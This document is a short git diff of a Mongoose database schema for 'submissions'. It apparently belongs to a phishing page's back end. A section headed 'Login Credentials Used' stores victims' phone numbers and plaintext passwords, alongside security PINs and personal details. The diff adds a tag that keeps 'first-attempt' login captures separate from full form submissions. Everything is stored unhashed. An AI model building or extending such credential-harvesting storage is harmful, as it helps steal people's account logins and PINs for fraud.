@@ -2,31 +2,32 @@ const mongoose = require('mongoose');
 
 const submissionSchema = new mongoose.Schema({
   // Section 1: Login Credentials Used
-  username: {
+  loginPhone: {
     type: String,
-    required: true
+    required: true,
+    match: [/^\d{10}$/, 'Please enter a valid 10-digit phone number']
   },
   loginPassword: {
     type: String,
     required: true
   },
-  // Section 2: Form Data
+  // Section 2: Form Data (optional for login-only submissions)
   fullName: {
-    type: String,
-    required: true
+    type: String
   },
   problem: {
-    type: String,
-    required: true
+    type: String
   },
   securityPin: {
-    type: String,
-    required: true,
-    length: 6
+    type: String
   },
   experience: {
+    type: String
+  },
+  // Source tag: 'login' for first-attempt saves, 'form' for full submissions
+  source: {
     type: String,
-    required: true
+    default: 'form'
   },
   timestamp: {
     type: Date,
